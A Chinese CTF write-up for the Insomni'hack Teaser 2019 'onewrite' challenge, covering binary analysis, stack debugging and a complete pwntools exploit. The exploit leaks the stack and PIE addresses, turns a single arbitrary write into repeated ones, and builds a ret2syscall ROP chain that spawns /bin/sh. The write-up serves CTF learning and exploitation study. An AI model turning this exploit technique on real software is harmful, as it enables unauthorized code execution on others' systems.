> 原文链接: https://www.anquanke.com//post/id/169912 


# Insomni'hack Teaser 2019-onewrite详细解析


                                阅读量   
                                **160435**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t0115b0ce4e2b3de54c.png)](https://p5.ssl.qhimg.com/t0115b0ce4e2b3de54c.png)

新年第一场比赛是由知名CTF战队0daysober举办的所以题目质量还是很好的，其中还有一些真实漏洞的利用。这里记录一下做题经历。这个题目的利用方式还是很新的很有借鉴意义。真的是比赛虐我千百遍我待比赛如初见。。

## 程序分析

首先打开程序的时候ida加载了很久，大概看了一下函数数量，编译的时候没有去符号很多libc库的函数都在但是file文件又是动态链接这里还是比较新奇他用的编译器是什么。。

### <a class="reference-link" name="main"></a>main

[![](https://p4.ssl.qhimg.com/t01bd796967b34844e1.png)](https://p4.ssl.qhimg.com/t01bd796967b34844e1.png)

首先main函数给了我们提示，这里会有一个leak和一个write的机会，但是只有一次额

### <a class="reference-link" name="do_leak"></a>do_leak

[![](https://p5.ssl.qhimg.com/t01228bae9d34bae249.png)](https://p5.ssl.qhimg.com/t01228bae9d34bae249.png)

大概分析一下程序，我们可以泄漏stack或者pie的地址但是均只有一次泄漏的机会，只能利用一次然后会进入到下一个函数overwrite

### <a class="reference-link" name="overwrite"></a>overwrite

[![](https://p2.ssl.qhimg.com/t0115f611fbb46b2a18.png)](https://p2.ssl.qhimg.com/t0115f611fbb46b2a18.png)

程序很简单就是输入地址然后我们能写入8个字节的一个数。

### <a class="reference-link" name="read_int3"></a>read_int3

[![](https://p3.ssl.qhimg.com/t0163930e377b42a18d.png)](https://p3.ssl.qhimg.com/t0163930e377b42a18d.png)

截图出这个函数的目的是因为这里限制了输入是15个字节所以在些exp的时候我们需要使用send而不是sendline否则会出现一些覆盖不成功的问题（作为新手的我被大佬点醒了的地方）

### <a class="reference-link" name="ROPchain%E5%88%86%E6%9E%90"></a>ROPchain分析

我一般用的工具是ropchain，因为这是栈的题目，二进制文件中又包含了大量的libc函数的信息，并且没有给我们libc版本我们也做不到泄漏libc版本这个操作（当时做题感觉做不到，后来发现可能可以做到没有去实现）

```
- Step 3 -- Init syscall arguments gadgets

   [+] Gadget found: 0x84fa pop rdi ; ret
   [+] Gadget found: 0xd9f2 pop rsi ; ret
   [+] Gadget found: 0x484c5 pop rdx ; ret
   [+] Gadget found: 0x917c syscall
```

搜索出来的结果还是比较在意料之中，所以大概估计就是利用ret2syscall了，不过接下来要解决的就是怎么做到循环利用之前的那些函数了，让任意写可以多次，来布置我们的栈。

静态分析大概就是这些，这个题目有大量的时间是需要进行动态调试才能实现。这里有个坑，我在py代码里使用gdb.attach(p)是会报错的，但是用raw_input暂停程序后在进行是不会出现这种问题的了。



## 动态调试

### <a class="reference-link" name="leak%E5%88%86%E6%9E%90"></a>leak分析

主要是看看泄漏出的地址是哪一个，这里贴出栈的地址，关于pie就是泄漏了do_leak函数

[![](https://p1.ssl.qhimg.com/t01ecfcd57eb8bd73f9.png)](https://p1.ssl.qhimg.com/t01ecfcd57eb8bd73f9.png)

[![](https://p0.ssl.qhimg.com/t01c5a2bb38b79bd23a.png)](https://p0.ssl.qhimg.com/t01c5a2bb38b79bd23a.png)

<a class="reference-link" name="%E4%B8%AD%E9%83%A8%E6%80%9D%E8%B7%AF"></a>**中部思路**

覆盖ret地址，循环利用泄漏pie。

### <a class="reference-link" name="%E8%BF%9B%E4%B8%80%E6%AD%A5%E8%B0%83%E8%AF%95"></a>进一步调试

这里就不贴图了，你会发现如果只覆盖一次那么在循环2次之后程序就会结束运行，我估计是栈的变动导致的，所以查看一下栈的分布。

[![](https://p5.ssl.qhimg.com/t015868983646e9e5d3.png)](https://p5.ssl.qhimg.com/t015868983646e9e5d3.png)

其中会有很多的其他栈信息，这里我们可以利用任意写不断的进行一个覆盖让栈里只剩下do_leak地址那么我们就可以重复利用多次了。下面贴一张覆盖后的图

[![](https://p1.ssl.qhimg.com/t014f36a014f07ce0b5.png)](https://p1.ssl.qhimg.com/t014f36a014f07ce0b5.png)

这里可以看见覆盖了好多。。。紧接着的地址就是我们的rop了。



## 思路分析

一、先进行第一次重复利用泄漏出pie地址<br>
二、不断填充栈使我们可以多次重复利用do_leak函数中的任意写函数<br>
三、布置ROP，在执行rop之前需要不断进行消耗do_leak地址因为之前写的比较多之后就可以getshell了



## exp

```
from pwn import*

p = process('./onewrite.dms')
#p=remote("onewrite.teaser.insomnihack.ch",1337)
context.log_level = 'debug'
raw_input()
def leak(number):
    p.recvuntil('&gt; ')
    p.sendline(str(number))
    stack = int(p.recvuntil('n'),16)
    return stack
def write(address,data):
    p.recvuntil(" : ")
    p.send(str(address))
    p.recvuntil(' : ')
    p.send(data)

stack = leak(1)
write(stack-8,chr(0x15))
leak_do = leak(2) - 0x8a15
Lbase = leak_do + 0x8a15
write(stack-0x20,'x15')

for i in range(10):
    leak('1')
    write(stack-8-0x18*(i+2),'x15')

for i in range(10):
    leak('2')
    if i%2==0:
        write(stack-0x108+0x30*int(i/2),p64(Lbase))
    else:
        write(stack-0xf0+0x30*int(i/2),p64(Lbase))

pop_rdi = leak_do+0x84fa
pop_rsi = leak_do+0xd9f2
pop_rdx = leak_do+0x484c5
pop_rax = leak_do+0x460ac
syscall = leak_do+0x4610E
bss = leak_do+0x2B3300

leak('1')
write(bss,'/bin/shx00')
payload = [pop_rax,0x3b,pop_rdi,bss,pop_rsi,0,pop_rdx,0,syscall]

for i in range(len(payload)):               
    leak('1')
    write(stack-0x20+i*8,p64(payload[i]))
raw_input()
for i in range(10):
    leak('1')
    write(stack-0x100,'peanuts')

p.interactive()
```



## 总结

这个题目的代码分析上很简单，但是更多的工作是在调试上，调试可能要花上好几个小时的时间，因为需要看栈的分布计算栈的位置等等问题很多。也学到了很多，国际赛最好的一点就是可以开拓你的思路，还是那句话比赛虐我千百遍，我待比赛如初恋啊。。
